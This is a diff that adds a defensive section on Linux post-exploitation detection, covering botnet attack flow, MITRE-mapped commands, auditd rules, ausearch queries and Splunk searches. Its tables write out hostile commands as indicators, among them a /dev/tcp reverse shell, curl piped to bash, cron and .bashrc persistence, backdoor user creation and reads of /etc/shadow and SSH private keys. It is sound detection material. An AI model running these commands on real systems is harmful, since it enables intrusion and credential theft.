@@ -2895,3 +2895,239 @@ ausearch -m SYSCALL -sc connect --start recent
 ✅ Alert on cron jobs executing shells or downloaders
 ✅ Verify file integrity of critical binaries after supply chain events
 ✅ Forward all auth.log events to SIEM for correlation
+## Linux Threat Detection — Post-Exploitation
+
+### Key Principles
+✅ Hack and Forget attacks are automated and performed at scale
+by botnets — they follow scripted patterns
+✅ In Linux, all attack stages mostly rely on prebuilt system
+commands like ls, cat, wget, curl, ssh and bash
+✅ Best detection approach: auditd + process tree analysis
+✅ No custom malware needed — attackers live off the land
+
+---
+
+### Hack and Forget Attacks
+**Characteristics:**
+- Fully automated — no human operator after initial compromise
+- Performed at massive scale by botnets
+- Follow predictable scripted patterns
+- Goal is usually: crypto mining, botnet expansion, data theft
+- Move on quickly — hundreds of targets per hour
+
+**Common Hack and Forget Attack Flow:**
+Botnet scans internet for port 22 (SSH)
+↓
+Automated credential stuffing/brute force
+↓
+Successful login (Initial Access)
+↓ (automated script executes)
+Recon commands: whoami, uname -a, id
+↓
+Download malware: wget/curl from C2 server
+↓
+Execute payload: chmod +x, ./payload
+↓
+Establish persistence: crontab, ~/.bashrc
+↓
+Move to next target — fully automated
+
+---
+
+### Living off the Land — Linux Attack Commands
+
+**Every attack stage uses prebuilt Linux commands:**
+
+#### Discovery Stage
+| Command | Purpose | MITRE Technique |
+|---------|---------|----------------|
+| `whoami` | Current user | T1033 |
+| `id` | User ID and groups | T1033 |
+| `uname -a` | OS and kernel version | T1082 |
+| `cat /etc/os-release` | Linux distribution info | T1082 |
+| `hostname` | Machine hostname | T1082 |
+| `ip a` or `ifconfig` | Network interfaces | T1016 |
+| `netstat -ano` or `ss -tulnp` | Active connections | T1049 |
+| `ps aux` | Running processes | T1057 |
+| `ls -la /home/` | User home directories | T1083 |
+| `cat /etc/passwd` | User accounts | T1087 |
+| `cat /etc/shadow` | Password hashes (if root) | T1003 |
+| `find / -perm -4000` | SUID files for privesc | T1548 |
+| `crontab -l` | Scheduled tasks | T1053 |
+
+#### Download and Execution Stage
+| Command | Purpose | Suspicious When |
+|---------|---------|----------------|
+| `wget URL` | Download file | Downloading from unknown IP |
+| `curl URL -o file` | Download file | Piped directly to bash |
+| `curl URL \| bash` | Download and execute | Always suspicious |
+| `chmod +x file` | Make executable | After download |
+| `./payload` | Execute payload | After chmod |
+| `python3 -c 'code'` | Execute Python inline | One-liner reverse shell |
+| `bash -i >& /dev/tcp/IP/PORT 0>&1` | Reverse shell | Always suspicious |
+
+#### Persistence Stage
+| Command | Purpose | Suspicious When |
+|---------|---------|----------------|
+| `crontab -e` | Edit cron jobs | Adding new entry |
+| `echo "* * * * * wget..." >> /etc/crontab` | Add cron job | External URL in cron |
+| `echo "bash -i..." >> ~/.bashrc` | Persist in bash startup | Shell command in .bashrc |
+| `echo "bash -i..." >> ~/.profile` | Persist in profile | Shell command in profile |
+| `systemctl enable malware` | Enable service | Unknown service |
+| `useradd -m backdoor` | Create backdoor user | Unexpected user creation |
+
+#### Lateral Movement Stage
+| Command | Purpose | Suspicious When |
+|---------|---------|----------------|
+| `ssh user@internal-ip` | SSH to internal host | Unusual source |
+| `scp file user@host:/path` | Copy files between hosts | Sensitive file transfer |
+| `cat ~/.ssh/known_hosts` | Find previously connected hosts | Recon for pivot targets |
+| `cat ~/.ssh/id_rsa` | Steal private SSH key | Credential theft |
+
+---
+
+### auditd Detection of Malicious Commands
+
+**auditd captures every command execution via EXECVE syscall.**
+This is the most reliable detection method for Linux attacks.
+
+**Key auditd rules for threat detection:**
+```bash
+# Monitor ALL command execution
+auditctl -a always,exit -F arch=b64 -S execve -k commands
+
+# Monitor wget and curl (download cradles)
+auditctl -a always,exit -F arch=b64 -S execve \
+-F exe=/usr/bin/wget -k suspicious_download
+auditctl -a always,exit -F arch=b64 -S execve \
+-F exe=/usr/bin/curl -k suspicious_download
+
+# Monitor crontab modifications
+auditctl -w /etc/crontab -p wa -k cron_modification
+auditctl -w /var/spool/cron -p wa -k cron_modification
+
+# Monitor passwd and shadow (credential access)
+auditctl -w /etc/passwd -p rwa -k passwd_access
+auditctl -w /etc/shadow -p rwa -k shadow_access
+
+# Monitor SSH known_hosts (lateral movement recon)
+auditctl -w /root/.ssh -p rwa -k ssh_recon
+
+# Monitor bash startup files (persistence)
+auditctl -w /root/.bashrc -p wa -k bashrc_modification
+auditctl -w /root/.profile -p wa -k profile_modification
+```
+
+**auditd search commands:**
+```bash
+# Find all wget/curl executions
+ausearch -x wget
+ausearch -x curl
+
+# Find reverse shell indicators
+ausearch -m EXECVE | grep -E "bash.*tcp|nc.*-e|python.*socket"
+
+# Find crontab modifications
+ausearch -k cron_modification
+
+# Find /etc/passwd access
+ausearch -k passwd_access
+
+# Find all commands run by specific user
+ausearch -ua www-data
+
+# Find recent suspicious downloads
+ausearch -x wget --start recent
+ausearch -x curl --start recent
+
+# Generate execution report
+aureport --exec --start recent
+```
+
+---
+
+### Process Tree Analysis for Post-Exploitation
+
+**Suspicious process trees by attack stage:**
+
+| Stage | Suspicious Chain | What it Indicates |
+|-------|-----------------|------------------|
+| **Initial Access** | sshd → bash → id/whoami | SSH compromise, recon starting |
+| **Download** | bash → wget → chmod → ./payload | Malware download and execution |
+| **Reverse Shell** | apache2 → bash -i | Web shell RCE |
+| **Persistence** | bash → crontab -e | Cron persistence |
+| **Lateral Movement** | bash → ssh internal-ip | Pivoting to internal host |
+| **Crypto Mining** | bash → ./xmrig | Crypto miner deployment |
+| **Hack and Forget** | sshd → bash → wget → chmod → ./miner | Full automated attack chain |
+
+---
+
+### Common Hack and Forget Payload Indicators
+```bash
+# Crypto miner processes to watch for
+ps aux | grep -E "xmrig|minerd|cryptonight|stratum"
+
+# Suspicious processes with high CPU (crypto mining)
+top    # Look for unknown processes at 100% CPU
+
+# Unusual network connections (C2 or mining pool)
+ss -tulnp | grep -v "expected_services"
+netstat -ano | grep ESTABLISHED
+
+# Files dropped in temp directories
+ls -la /tmp/
+ls -la /var/tmp/
+ls -la /dev/shm/
+
+# Recently created executable files
+find /tmp /var/tmp /dev/shm -type f -newer /etc/passwd 2>/dev/null
+find / -name "*.sh" -newer /etc/passwd -not -path "/proc/*" 2>/dev/null
+```
+
+---
+
+### Splunk Searches for Linux Post-Exploitation
+```spl
+# Detect wget/curl download cradles
+index=linux source="/var/log/audit/audit.log"
+(type=EXECVE a0="wget" OR a0="curl")
+| table _time, host, uid, a0, a1, a2
+
+# Detect reverse shell indicators
+index=linux source="/var/log/audit/audit.log" type=EXECVE
+(a1="*bash*-i*" OR a2="*/dev/tcp/*" OR a1="*nc*-e*")
+| table _time, host, uid, a0, a1, a2
+
+# Detect crontab modification
+index=linux source="/var/log/audit/audit.log"
+key=cron_modification
+| table _time, host, uid, name
+
+# Detect /etc/shadow access (credential theft)
+index=linux source="/var/log/audit/audit.log"
+key=shadow_access
+| table _time, host, uid, name, success
+
+# Detect high frequency command execution (automated attack)
+index=linux source="/var/log/audit/audit.log" type=EXECVE
+| stats count by host, uid
+| where count > 100
+| sort -count
+```
+
+---
+
+### Linux Post-Exploitation SOC Checklist
+✅ Alert on wget/curl downloading from external IPs
+✅ Alert on curl URL piped to bash (always malicious)
+✅ Alert on chmod +x after download
+✅ Monitor /tmp, /var/tmp, /dev/shm for new executables
+✅ Alert on bash -i or /dev/tcp reverse shell patterns
+✅ Monitor crontab for new entries with external URLs
+✅ Alert on ~/.bashrc or ~/.profile modifications
+✅ Watch for new user accounts created (useradd)
+✅ Monitor for high CPU processes (crypto mining)
+✅ Check auditd for /etc/shadow access (credential theft)
+✅ Alert on SSH to internal IPs from compromised host
+✅ Alert on cat ~/.ssh/id_rsa (SSH key theft)
+✅ Correlate all activity with the initial auth.log event
